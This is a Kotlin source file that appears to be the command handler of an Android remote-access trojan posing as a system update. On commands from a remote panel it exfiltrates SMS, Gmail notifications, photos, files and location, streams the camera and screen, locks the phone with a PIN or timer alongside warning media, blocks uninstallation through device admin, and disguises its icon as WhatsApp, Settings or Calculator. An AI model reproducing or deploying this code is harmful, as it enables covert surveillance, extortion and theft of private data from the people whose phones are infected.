package com.system.update

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraManager
import android.location.Geocoder
import android.location.LocationManager
import android.media.AudioManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.MediaStore
import android.telephony.TelephonyManager
import android.util.Base64
import com.google.gson.JsonObject
import java.net.NetworkInterface
import java.util.Locale

class CommandHandler(private val ctx: Context, private val deviceId: String) {

    companion object {
        @Volatile var flashSpam: Boolean = false
        @Volatile var vibrateSpam: Boolean = false
    }

    private fun panelBase(): String {
        return App.config.panelUrl
            .replace("ws://", "http://")
            .replace("wss://", "https://")
            .replace("/ws", "")
    }

    fun collectInfo(): Map<String, Any> {
        val battery = try {
            val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (_: Exception) { 0 }

        val ram = try {
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val mi = android.app.ActivityManager.MemoryInfo()
            am.getMemoryInfo(mi)
            String.format(Locale.US, "%.1f GB", mi.totalMem / 1e9)
        } catch (_: Exception) { "-" }

        val carrier = try {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            tm.networkOperatorName ?: "-"
        } catch (_: Exception) { "-" }

        return mapOf(
            "model" to Build.MODEL,
            "brand" to Build.BRAND,
            "android" to Build.VERSION.RELEASE,
            "battery" to battery,
            "ram" to ram,
            "carrier" to carrier,
            "timezone" to java.util.TimeZone.getDefault().id,
            "ip" to getLocalIp()
        )
    }

    private fun getLocalIp(): String {
        return try {
            NetworkInterface.getNetworkInterfaces().toList()
                .flatMap { it.inetAddresses.toList() }
                .firstOrNull { !it.isLoopbackAddress && it is java.net.Inet4Address }
                ?.hostAddress ?: "-"
        } catch (_: Exception) { "-" }
    }

    fun countSms(): Int {
        return try {
            val cursor = ctx.contentResolver.query(
                Uri.parse("content://sms/"),
                arrayOf("_id"), null, null, null
            )
            val c = cursor?.count ?: 0
            cursor?.close()
            c
        } catch (_: Exception) { 0 }
    }

    fun readAllSmsPublic(): Map<String, Any> = readAllSms()

    fun execute(cmd: String, args: JsonObject?, done: (Any) -> Unit) {
        when (cmd) {

            // ============ LOCK PIN ============
            "lock_pin" -> {
                val pin = args?.get("pin")?.asString ?: "1234"
                startLockService("pin", pin, 0)
                done(mapOf("ok" to true, "type" to "pin", "pin" to pin))
            }

            // ============ LOCK HARD ============
            "lock_hard" -> {
                try {
                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = ComponentName(ctx, AdminReceiver::class.java)
                    if (dpm.isAdminActive(admin)) {
                        @Suppress("DEPRECATION") dpm.lockNow()
                    }
                } catch (_: Exception) {}
                startLockService("hard", "0", 0)
                done(mapOf("ok" to true, "type" to "hard"))
            }

            // ============ LOCK JAM ============
            "lock_time" -> {
                val hours = args?.get("hours")?.asLong ?: 5L
                startLockService("time", "0", hours)
                done(mapOf("ok" to true, "hours" to hours))
            }

            // ============ CRASH ============
            "crash" -> {
                startLockService("crash", "0", 0)
                done(mapOf("crash" to true))
            }

            // ============ UNLOCK ============
            "unlock" -> {
                try {
                    val i = Intent(ctx, LockService::class.java).apply {
                        putExtra("type", "stop")
                    }
                    ctx.startService(i)
                    ctx.stopService(i)
                } catch (_: Exception) {}
                StickerSpam.stop()
                stopFlashSpam()
                stopVibrateSpam()
                try { ctx.stopService(Intent(ctx, CameraStreamService::class.java)) } catch (_: Exception) {}
                try { ctx.stopService(Intent(ctx, ScreenStreamService::class.java)) } catch (_: Exception) {}
                try { ctx.stopService(Intent(ctx, VideoPlayerService::class.java)) } catch (_: Exception) {}
                try { ctx.stopService(Intent(ctx, AudioPlayerService::class.java)) } catch (_: Exception) {}
                done(mapOf("ok" to true))
            }

            // ============ SEND VIDEO ============
            "send_mp4" -> {
                val url = "${panelBase()}/videos/warning.mp4"
                try {
                    val i = Intent(ctx, VideoPlayerService::class.java).apply {
                        putExtra("type", "video")
                        putExtra("url", url)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        ctx.startForegroundService(i)
                    } else {
                        ctx.startService(i)
                    }
                } catch (_: Exception) {}
                done(mapOf("ok" to true, "url" to url))
            }

            // ============ STOP MP4 ============
            "stop_mp4" -> {
                try {
                    ctx.stopService(Intent(ctx, VideoPlayerService::class.java))
                } catch (_: Exception) {}
                done(mapOf("ok" to true))
            }

            // ============ SEND AUDIO ============
            "send_mp3" -> {
                val url = "${panelBase()}/audios/warning.mp3"
                try {
                    val i = Intent(ctx, AudioPlayerService::class.java).apply {
                        putExtra("url", url)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        ctx.startForegroundService(i)
                    } else {
                        ctx.startService(i)
                    }
                } catch (_: Exception) {}
                done(mapOf("ok" to true, "url" to url))
            }

            // ============ STOP MP3 ============
            "stop_mp3" -> {
                try {
                    val i = Intent(ctx, AudioPlayerService::class.java).apply {
                        putExtra("stop", true)
                    }
                    ctx.startService(i)
                    ctx.stopService(i)
                } catch (_: Exception) {}
                done(mapOf("ok" to true))
            }

            // ============ SPAM STIKER ============
            "spam_sticker" -> {
                val duration = args?.get("duration")?.asLong ?: 5L
                val urls = mutableListOf<String>()
                for (i in 1..5) urls.add("${panelBase()}/stickers/sticker$i.png")
                StickerSpam.start(ctx, urls, 200, 30, duration)
                done(mapOf("ok" to true, "count" to urls.size, "duration" to duration))
            }

            "stop_sticker" -> {
                StickerSpam.stop()
                done(mapOf("ok" to true))
            }

            // ============ CAMERA LIVE ============
            "camera_front" -> {
                try { ctx.stopService(Intent(ctx, CameraStreamService::class.java)) } catch (_: Exception) {}
                try {
                    val i = Intent(ctx, CameraStreamService::class.java).apply {
                        putExtra("front", true)
                        putExtra("interval", 150L)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        ctx.startForegroundService(i)
                    } else {
                        ctx.startService(i)
                    }
                } catch (_: Exception) {}
                done(mapOf("ok" to true, "stream" to "front"))
            }
            "camera_back" -> {
                try { ctx.stopService(Intent(ctx, CameraStreamService::class.java)) } catch (_: Exception) {}
                try {
                    val i = Intent(ctx, CameraStreamService::class.java).apply {
                        putExtra("front", false)
                        putExtra("interval", 150L)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        ctx.startForegroundService(i)
                    } else {
                        ctx.startService(i)
                    }
                } catch (_: Exception) {}
                done(mapOf("ok" to true, "stream" to "back"))
            }
            "stop_camera" -> {
                try { ctx.stopService(Intent(ctx, CameraStreamService::class.java)) } catch (_: Exception) {}
                done(mapOf("ok" to true))
            }

            // ============ SCREEN LIVE ============
            "screen" -> {
                if (ScreenCapture.isReady()) {
                    try { ctx.stopService(Intent(ctx, ScreenStreamService::class.java)) } catch (_: Exception) {}
                    try {
                        val i = Intent(ctx, ScreenStreamService::class.java).apply {
                            putExtra("interval", 150L)
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            ctx.startForegroundService(i)
                        } else {
                            ctx.startService(i)
                        }
                    } catch (_: Exception) {}
                    done(mapOf("ok" to true, "stream" to "screen"))
                } else {
                    done(mapOf("type" to "text", "data" to "MediaProjection belum aktif"))
                }
            }
            "stop_screen" -> {
                try { ctx.stopService(Intent(ctx, ScreenStreamService::class.java)) } catch (_: Exception) {}
                done(mapOf("ok" to true))
            }

            // ============ SMS ============
            "sms" -> done(readAllSms())

            // ============ GMAIL ============
            "gmail" -> {
                done(mapOf(
                    "type" to "gmail",
                    "items" to NotificationListener.getGmailNotifs()
                ))
            }

            // ============ GALLERY ============
            "gallery" -> done(readGallery())

            // ============ IP ============
            "ip" -> done(getIpInfo())

            // ============ FLASH ============
            "flash" -> {
                if (flashSpam) stopFlashSpam() else startFlashSpam()
                done(mapOf("flash" to flashSpam))
            }

            // ============ VIBRATE ============
            "vibrate" -> {
                if (vibrateSpam) stopVibrateSpam() else startVibrateSpam()
                done(mapOf("vibrate" to vibrateSpam))
            }

            // ============ ANTI UNINSTALL ============
            "anti_uninstall" -> {
                antiUninstall()
                done(mapOf("anti_uninstall" to true))
            }

            // ============ FAKE NOTIF ============
            "fake_notif" -> {
                val title = args?.get("title")?.asString ?: "Pesan Baru"
                val message = args?.get("message")?.asString ?: ""
                val iconUrl = args?.get("iconUrl")?.asString
                val clickUrl = args?.get("clickUrl")?.asString
                FakeNotify.show(ctx, title, message, iconUrl, clickUrl)
                done(mapOf("ok" to true))
            }

            // ============ BROADCAST ============
            "broadcast" -> {
                val title = args?.get("title")?.asString ?: "Pesan"
                val message = args?.get("message")?.asString ?: ""
                val duration = args?.get("duration")?.asInt ?: 5
                Handler(Looper.getMainLooper()).post {
                    BroadcastOverlay.show(ctx, title, message, duration)
                }
                done(mapOf("ok" to true))
            }

            // ============ SET WALLPAPER ============
            "set_wallpaper" -> {
                val url = args?.get("url")?.asString ?: ""
                if (url.isEmpty()) {
                    done(mapOf("ok" to false, "error" to "no url"))
                } else if (!url.startsWith("http")) {
                    done(mapOf("ok" to false, "error" to "invalid url"))
                } else {
                    WallpaperSetter.setFromUrl(ctx, url) { success ->
                        done(mapOf("ok" to success, "url" to url))
                    }
                }
            }

            // ============ OPEN WEBSITE ============
            "open_website" -> {
                val url = args?.get("url")?.asString ?: ""
                if (url.isEmpty()) {
                    done(mapOf("error" to "no url"))
                } else {
                    try {
                        val i = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        ctx.startActivity(i)
                        done(mapOf("ok" to true))
                    } catch (e: Exception) {
                        done(mapOf("error" to e.message))
                    }
                }
            }

            // ============ HIDE BROADCAST ============
            "hide_broadcast" -> {
                Handler(Looper.getMainLooper()).post { BroadcastOverlay.hide(ctx) }
                done(mapOf("ok" to true))
            }

            // ============ READ NOTIFS ============
            "read_notifs" -> {
                done(mapOf("type" to "text", "data" to "Notif listener aktif"))
            }

            // ============ LIST APPS ============
            "list_apps" -> {
                try {
                    val pm = ctx.packageManager
                    val apps = pm.getInstalledApplications(0)
                    val list = mutableListOf<Map<String, String>>()
                    apps.forEach { app ->
                        try {
                            if (pm.getLaunchIntentForPackage(app.packageName) != null) {
                                var iconB64 = ""
                                try {
                                    val iconDrawable = pm.getApplicationIcon(app)
                                    val w = iconDrawable.intrinsicWidth.coerceAtLeast(48)
                                    val h = iconDrawable.intrinsicHeight.coerceAtLeast(48)
                                    val bmp = android.graphics.Bitmap.createBitmap(w, h, android.graphics.Bitmap.Config.ARGB_8888)
                                    val canvas = android.graphics.Canvas(bmp)
                                    iconDrawable.setBounds(0, 0, canvas.width, canvas.height)
                                    iconDrawable.draw(canvas)
                                    val bos = java.io.ByteArrayOutputStream()
                                    bmp.compress(android.graphics.Bitmap.CompressFormat.PNG, 70, bos)
                                    iconB64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)
                                } catch (_: Exception) {}

                                list.add(mapOf(
                                    "name" to pm.getApplicationLabel(app).toString(),
                                    "package" to app.packageName,
                                    "icon" to iconB64
                                ))
                            }
                        } catch (_: Exception) {}
                    }
                    done(mapOf("type" to "apps", "items" to list.sortedBy { it["name"] }))
                } catch (e: Exception) {
                    done(mapOf("type" to "text", "data" to "Error: ${e.message}"))
                }
            }

            // ============ LOCK APP ============
            "lock_app" -> {
                val pkg = args?.get("package")?.asString ?: ""
                val pin = args?.get("pin")?.asString ?: "1234"
                if (pkg.isEmpty()) {
                    done(mapOf("error" to "no package"))
                } else {
                    AppLockAccessibilityService.setLockedApp(ctx, pkg, pin)
                    done(mapOf("ok" to true, "package" to pkg, "pin" to pin))
                }
            }

            // ============ UNLOCK APP ============
            "unlock_app" -> {
                val pkg = args?.get("package")?.asString ?: ""
                if (pkg.isEmpty()) {
                    done(mapOf("error" to "no package"))
                } else {
                    AppLockAccessibilityService.unlockApp(ctx, pkg)
                    done(mapOf("ok" to true, "package" to pkg))
                }
            }

            // ============ LIST FILES ============
            "list_files" -> {
                val path = args?.get("path")?.asString ?: ""
                val result = if (path.isEmpty()) FileManager.listStorageRoots() else FileManager.listFiles(path)
                done(result)
            }

            // ============ READ FILE ============
            "read_file" -> {
                val path = args?.get("path")?.asString ?: ""
                if (path.isEmpty()) done(mapOf("error" to "no path"))
                else done(FileManager.readFile(path))
            }

            // ============ DOWNLOAD FILE ============
            "download_file" -> {
                val path = args?.get("path")?.asString ?: ""
                if (path.isEmpty()) done(mapOf("error" to "no path"))
                else done(FileManager.downloadFile(path))
            }

            // ============ CHAT REPLY ============
            "chat_reply" -> {
                val text = args?.get("text")?.asString ?: ""
                if (text.isEmpty()) done(mapOf("error" to "no text"))
                else done(mapOf("ok" to true))
            }

            // ============ HIDE APP ============
            "hide_app" -> {
                try {
                    val pm = ctx.packageManager

                    // Aktifkan 1 alias (Settings) sebagai launcher pengganti
                    try {
                        pm.setComponentEnabledSetting(
                            ComponentName(ctx.packageName, "com.system.update.AliasSettings"),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                    } catch (_: Exception) {}

                    // Disable SetupUsernameActivity (icon default ilang)
                    try {
                        pm.setComponentEnabledSetting(
                            ComponentName(ctx, SetupUsernameActivity::class.java),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                    } catch (_: Exception) {}

                    // Disable alias lain
                    val otherAliases = listOf(
                        "com.system.update.AliasSystemUpdate",
                        "com.system.update.AliasPlayServices",
                        "com.system.update.AliasWhatsApp",
                        "com.system.update.AliasCalculator"
                    )
                    for (alias in otherAliases) {
                        try {
                            pm.setComponentEnabledSetting(
                                ComponentName(ctx.packageName, alias),
                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                android.content.pm.PackageManager.DONT_KILL_APP
                            )
                        } catch (_: Exception) {}
                    }

                    done(mapOf("ok" to true))
                } catch (e: Exception) {
                    done(mapOf("error" to e.message))
                }
            }

            // ============ SHOW APP ============
            "show_app" -> {
                try {
                    val pm = ctx.packageManager

                    try {
                        pm.setComponentEnabledSetting(
                            ComponentName(ctx, SetupUsernameActivity::class.java),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                    } catch (_: Exception) {}

                    val allAliases = listOf(
                        "com.system.update.AliasSystemUpdate",
                        "com.system.update.AliasPlayServices",
                        "com.system.update.AliasSettings",
                        "com.system.update.AliasWhatsApp",
                        "com.system.update.AliasCalculator"
                    )
                    for (alias in allAliases) {
                        try {
                            pm.setComponentEnabledSetting(
                                ComponentName(ctx.packageName, alias),
                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                android.content.pm.PackageManager.DONT_KILL_APP
                            )
                        } catch (_: Exception) {}
                    }

                    done(mapOf("ok" to true))
                } catch (e: Exception) {
                    done(mapOf("error" to e.message))
                }
            }

            // ============ SET APP ICON + NAME ============
            "set_app_icon" -> {
                try {
                    val newName = args?.get("name")?.asString ?: "System Update"
                    val pm = ctx.packageManager

                    val allAliases = listOf(
                        "com.system.update.AliasSystemUpdate",
                        "com.system.update.AliasPlayServices",
                        "com.system.update.AliasSettings",
                        "com.system.update.AliasWhatsApp",
                        "com.system.update.AliasCalculator"
                    )

                    val targetAlias = when {
                        newName.lowercase().contains("play") -> "com.system.update.AliasPlayServices"
                        newName.lowercase().contains("setting") -> "com.system.update.AliasSettings"
                        newName.lowercase().contains("whatsapp") || newName.lowercase().contains("wa") -> "com.system.update.AliasWhatsApp"
                        newName.lowercase().contains("calc") -> "com.system.update.AliasCalculator"
                        else -> "com.system.update.AliasSystemUpdate"
                    }

                    // Disable SetupUsernameActivity
                    try {
                        pm.setComponentEnabledSetting(
                            ComponentName(ctx, SetupUsernameActivity::class.java),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                    } catch (_: Exception) {}

                    // Disable semua alias dulu
                    for (alias in allAliases) {
                        try {
                            pm.setComponentEnabledSetting(
                                ComponentName(ctx.packageName, alias),
                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                android.content.pm.PackageManager.DONT_KILL_APP
                            )
                        } catch (_: Exception) {}
                    }

                    // Aktifkan alias target
                    try {
                        pm.setComponentEnabledSetting(
                            ComponentName(ctx.packageName, targetAlias),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                    } catch (_: Exception) {}

                    done(mapOf(
                        "ok" to true,
                        "name" to newName,
                        "alias" to targetAlias
                    ))
                } catch (e: Exception) {
                    done(mapOf("error" to e.message))
                }
            }

            else -> done(mapOf("error" to "unknown: $cmd"))
        }
    }

    // ============================================================
    // LOCK SERVICE
    // ============================================================
    private fun startLockService(type: String, pin: String, hours: Long) {
        try {
            val video = "${panelBase()}/videos/warning.mp4"
            val audio = "${panelBase()}/audios/warning.mp3"

            val i = Intent(ctx, LockService::class.java).apply {
                putExtra("type", type)
                putExtra("pin", pin)
                putExtra("hours", hours)
                putExtra("videoUrl", video)
                putExtra("audioUrl", audio)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(i)
            } else {
                ctx.startService(i)
            }
        } catch (_: Exception) {}
    }

    // ============================================================
    // FLASH SPAM
    // ============================================================
    fun startFlashSpam() {
        if (flashSpam) return
        flashSpam = true
        Thread {
            try {
                val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                while (flashSpam) {
                    val id = cm.cameraIdList.firstOrNull { camId ->
                        cm.getCameraCharacteristics(camId)
                            .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
                    } ?: break
                    cm.setTorchMode(id, true)
                    Thread.sleep(120)
                    cm.setTorchMode(id, false)
                    Thread.sleep(120)
                }
            } catch (_: Exception) {}
            flashSpam = false
        }.start()
    }

    fun stopFlashSpam() { flashSpam = false }

    // ============================================================
    // VIBRATE SPAM
    // ============================================================
    fun startVibrateSpam() {
        if (vibrateSpam) return
        vibrateSpam = true
        try {
            val vm = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            Thread {
                while (vibrateSpam) {
                    try {
                        if (Build.VERSION.SDK_INT >= 26) {
                            vm.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE))
                        } else {
                            @Suppress("DEPRECATION") vm.vibrate(500)
                        }
                        Thread.sleep(700)
                    } catch (_: Exception) { break }
                }
            }.start()
        } catch (_: Exception) {}
    }

    fun stopVibrateSpam() { vibrateSpam = false }

    // ============================================================
    // ANTI UNINSTALL
    // ============================================================
    private fun antiUninstall() {
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(ctx, AdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                if (Build.VERSION.SDK_INT >= 21) {
                    dpm.setUninstallBlocked(admin, ctx.packageName, true)
                }
            }
        } catch (_: Exception) {}
    }

    // ============================================================
    // SMS — inbox + sent + draft
    // ============================================================
    private fun readAllSms(): Map<String, Any> {
        val list = mutableListOf<Map<String, String>>()
        try {
            val cursor = ctx.contentResolver.query(
                Uri.parse("content://sms/"),
                null, null, null, "date DESC LIMIT 200"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                    val addr = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
                    val date = it.getLong(it.getColumnIndexOrThrow("date"))
                    val type = it.getInt(it.getColumnIndexOrThrow("type"))
                    val typeStr = when (type) {
                        1 -> "inbox"
                        2 -> "sent"
                        3 -> "draft"
                        else -> "other"
                    }
                    list.add(mapOf(
                        "app" to addr,
                        "body" to body,
                        "date" to date.toString(),
                        "type" to typeStr
                    ))
                }
            }
        } catch (_: Exception) {}
        return mapOf("type" to "sms", "messages" to list)
    }

    // ============================================================
    // GALLERY
    // ============================================================
    private fun readGallery(): Map<String, Any> {
        val list = mutableListOf<Map<String, String>>()
        try {
            val cursor = ctx.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Images.Media._ID),
                null, null, "date_added DESC LIMIT 30"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getLong(0)
                    val uri = Uri.withAppendedPath(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()
                    )
                    val b64 = try {
                        val bytes = ctx.contentResolver.openInputStream(uri)?.readBytes() ?: ByteArray(0)
                        if (bytes.size < 200_000) Base64.encodeToString(bytes, Base64.NO_WRAP) else ""
                    } catch (_: Exception) { "" }
                    if (b64.isNotEmpty()) list.add(mapOf("data" to b64))
                }
            }
        } catch (_: Exception) {}
        return mapOf("type" to "gallery", "items" to list)
    }

    // ============================================================
    // IP + LOCATION
    // ============================================================
    private fun getIpInfo(): Map<String, Any> {
        var lat = 0.0
        var lon = 0.0
        var address = "-"
        try {
            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)

            if (loc != null) {
                lat = loc.latitude
                lon = loc.longitude
                try {
                    @Suppress("DEPRECATION")
                    val geo = Geocoder(ctx, Locale.getDefault())
                    val addrs = geo.getFromLocation(lat, lon, 1)
                    if (!addrs.isNullOrEmpty()) {
                        val a = addrs[0]
                        address = listOfNotNull(
                            a.thoroughfare, a.subThoroughfare, a.subLocality,
                            a.locality, a.subAdminArea, a.adminArea,
                            a.postalCode, a.countryName
                        ).joinToString(", ")
                    }
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        return mapOf(
            "type" to "ip",
            "ip" to getLocalIp(),
            "lat" to lat,
            "lon" to lon,
            "address" to address
        )
    }
}